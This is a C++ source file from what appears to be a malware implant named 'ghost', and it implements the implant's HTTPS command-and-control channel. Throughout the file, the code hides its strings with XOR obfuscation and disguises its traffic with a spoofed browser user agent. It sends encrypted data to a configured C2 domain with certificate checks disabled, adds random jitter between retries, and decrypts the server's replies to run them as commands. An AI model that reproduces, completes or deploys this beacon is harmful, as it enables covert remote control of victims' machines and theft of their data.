#include "c2.h"
#include "../core/ghost_core.h"
#include "../core/config.h"
#include "../crypto/crypto.h"

#include <windows.h>
#include <winhttp.h>
#include <vector>
#include <string>
#include <random> 

#pragma comment(lib, "winhttp.lib")

namespace ghost {
namespace c2 {

namespace {
    template <size_t N>
    class ObfuscatedWString {
        wchar_t m_data[N];
        wchar_t m_key;
    public:
        constexpr ObfuscatedWString(const wchar_t (&str)[N], wchar_t key) : m_data{0}, m_key(key) {
            for (size_t i = 0; i < N; ++i) m_data[i] = str[i] ^ key;
        }
        std::wstring decrypt() const {
            std::wstring result(N - 1, L'\0');
            for (size_t i = 0; i < N - 1; ++i) result[i] = m_data[i] ^ m_key;
            return result;
        }
    };
    #define OBF_W(str) ObfuscatedWString<sizeof(str)/sizeof(wchar_t)>(str, L'K').decrypt()

    template <size_t N>
    class ObfuscatedAString {
        char m_data[N];
        char m_key;
    public:
        constexpr ObfuscatedAString(const char (&str)[N], char key) : m_data{0}, m_key(key) {
            for (size_t i = 0; i < N; ++i) m_data[i] = str[i] ^ key;
        }
        std::string decrypt() const {
            std::string result(N - 1, '\0');
            for (size_t i = 0; i < N - 1; ++i) result[i] = m_data[i] ^ m_key;
            return result;
        }
    };
    #define OBF_A(str) ObfuscatedAString<sizeof(str)/sizeof(char)>(str, 'K').decrypt()

    int GetRandomInt(int min, int max) {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(min, max);
        return dis(gen);
    }
}

void LogError(const std::string& stage) {
    DWORD err = GetLastError();
    std::string errMsg = OBF_A("[HTTPS ERROR] ") + stage + OBF_A(" failed. Code: ") + std::to_string(err) + OBF_A("\n");
    OutputDebugStringA(errMsg.c_str());
}

struct HttpHandle {
    HINTERNET handle = nullptr;

    HttpHandle(HINTERNET h = nullptr) : handle(h) {}
    ~HttpHandle() {
        if (handle) WinHttpCloseHandle(handle);
    }

    operator HINTERNET() const { return handle; }
    bool valid() const { return handle != nullptr; }
};

bool SendHTTPS(const uint8_t* data, size_t len) {

    if (!data || len == 0) {
        LogError(OBF_A("Invalid input"));
        return false;
    }

    std::vector<uint8_t> encrypted;
    if (!crypto::Encrypt(data, len, encrypted)) {
        LogError(OBF_A("Encrypt"));
        return false;
    }

    const int maxRetries = 3;

    for (int attempt = 0; attempt < maxRetries; ++attempt) {

        std::wstring userAgent = OBF_W(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");

        HttpHandle hSession(WinHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0
        ));

        if (!hSession.valid()) {
            LogError(OBF_A("WinHttpOpen"));
            continue;
        }

        DWORD tlsOptions = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
        WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &tlsOptions, sizeof(tlsOptions));

        HttpHandle hConnect(WinHttpConnect(
            hSession,
            config::C2_HTTPS_DOMAIN, 
            INTERNET_DEFAULT_HTTPS_PORT,
            0
        ));

        if (!hConnect.valid()) {
            LogError(OBF_A("WinHttpConnect"));
            continue;
        }

        std::wstring method = OBF_W(L"POST");

        HttpHandle hRequest(WinHttpOpenRequest(
            hConnect,
            method.c_str(),
            config::C2_HTTPS_PATH,
            nullptr,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE
        ));

        if (!hRequest.valid()) {
            LogError(OBF_A("WinHttpOpenRequest"));
            continue;
        }

        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

        WinHttpSetTimeouts(hRequest, 5000, 5000, 5000, 5000);

        std::wstring headers = OBF_W(L"Content-Type: application/octet-stream\r\n");

        BOOL result = WinHttpSendRequest(
            hRequest,
            headers.c_str(),
            (DWORD)headers.length(),
            (LPVOID)encrypted.data(),
            (DWORD)encrypted.size(),
            (DWORD)encrypted.size(),
            0
        );

        if (!result) {
            LogError(OBF_A("WinHttpSendRequest"));
            int delay = GetRandomInt(1000, 2500) * (attempt + 1);
            Sleep(delay);
            continue;
        }

        result = WinHttpReceiveResponse(hRequest, nullptr);
        if (!result) {
            LogError(OBF_A("WinHttpReceiveResponse"));
            int delay = GetRandomInt(1000, 2500) * (attempt + 1);
            Sleep(delay);
            continue;
        }

        std::vector<uint8_t> reply;
        DWORD bytesRead = 0;

        do {
            uint8_t buffer[1024];

            if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                LogError(OBF_A("WinHttpReadData"));
                break;
            }

            reply.insert(reply.end(), buffer, buffer + bytesRead);

        } while (bytesRead > 0);

        if (!reply.empty()) {
            std::vector<uint8_t> decrypted;

            if (crypto::Decrypt(reply.data(), reply.size(), decrypted)) {
                ProcessCommand(decrypted.data(), decrypted.size());
            } else {
                LogError(OBF_A("Decrypt"));
            }
        }

        return true;
    }

    return false;
}

} 
}